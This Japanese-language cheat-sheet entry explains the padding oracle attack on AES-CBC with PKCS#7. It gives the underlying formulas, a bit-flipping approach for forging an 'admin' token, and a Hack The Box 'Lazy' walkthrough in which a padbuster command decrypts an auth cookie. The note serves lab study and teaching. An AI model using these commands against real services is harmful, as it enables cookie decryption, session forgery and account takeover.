# Crypto
----

## Padding Oracle Attack
* 対象はAES CBC with PKCS#7

* パディングオラクルが存在する時、利用可能
  * 例えば復号された平文は公開されないが、復号時のエラーメッセージが公開されるケース
  * 正常に復元できたか、パディングが正しくないか、パディングは正しいが平文の形式が間違っているか、がエラーメッセージで判別可能
  
* 原理
  * PKCS#7のパディングの形式は、長さの異なる16パターンの形式しか存在しない
    * 0x01, 0x0202, 0x030303,  --- , 0x10101010101010101010101010101010
    
  * AES CBCの復元は次の式にならう
    $$
    m_n = Dec(c_n) \oplus c_{n-1}
    $$
    
  * 仮に次の式が成立するような、c'を求めることができれば、平文mを導出することが可能
    $$
    0x10101010101010101010101010101010 = Dec(c_n) \oplus c'_{n-1}
    $$
  
  * そのためには、次の式が成立するようなc''を求めることができればよい
    $$
    0x??0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f = Dec(c_n) \oplus c''_{n-1} \\
    $$
  
  * なぜならば、パディングオラクルを利用し、不明な1byte（??）を総当りすることで、c'はc''から導出可能であるためである
    $$
    c'_{n-1} = c''_{n-1}　\oplus 0x??0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f \oplus 0x10101010101010101010101010101010
    $$
    
  * 以上を再帰的に繰り返す。最大の試行回数は256 * 16通り
  
* 攻撃手法
  * Burp SuiteのIntruderのBit flipperで脆弱性の有無を検証可能
  * 暗号文の1bitのスワップは平文の1bitのスワップと同等
    * 仮に"admin"の暗号文を取得したい場合、"cdmin"などの"admin"と1bit異なる平文の暗号文を生成し、暗号文の各桁のビットをBit flipした複数の暗号文を生成し、パディングオラクルで前記複数の暗号文から"admin"の暗号文を絞り込めばよい
  
* Htb: Lazy
  ```console
  ┌─[✗]─[rio@parrot]─[~/Htb/Lazy]
  └──╼ $padbuster http://lazy.htb fqD1YwpYFnOQhgYQcEod2xr5ijnHbZ74 8 -cookies 'auth=fqD1YwpYFnOQhgYQcEod2xr5ijnHbZ74' -encoding 0
  
  +-------------------------------------------+
  | PadBuster - v0.3.3                        |
  | Brian Holyfield - Gotham Digital Science  |
  | labs@gdssecurity.com                      |
  +-------------------------------------------+
  
  INFO: The original request returned the following
  [+] Status: 200
  [+] Location: N/A
  [+] Content Length: 977
  
  INFO: Starting PadBuster Decrypt Mode
  *** Starting Block 1 of 2 ***
  
  INFO: No error string was provided...starting response analysis
  
   *** Response Analysis Complete ***
  
  The following response signatures were returned:
  
  -------------------------------------------------------
  ID#     Freq    Status  Length  Location
  -------------------------------------------------------
  1       1       200     1133    N/A
  2 **    255     200     15      N/A
  -------------------------------------------------------
  
  Enter an ID that matches the error condition
  NOTE: The ID# marked with ** is recommended : 2
  
  Continuing test with selection 2
  
  
  [+] Success: (227/256) [Byte 8]
  [+] Success: (131/256) [Byte 7]
  [+] Success: (215/256) [Byte 6]
  [+] Success: (205/256) [Byte 5]
  [+] Success: (236/256) [Byte 4]
  [+] Success: (106/256) [Byte 3]
  [+] Success: (44/256) [Byte 2]
  [+] Success: (253/256) [Byte 1]
  
  Block 1 Results:
  [+] Cipher Text (HEX): 90860610704a1ddb
  [+] Intermediate Bytes (HEX): 0bd39011372a7f1c
  [+] Plain Text: user=rio
  ```

  

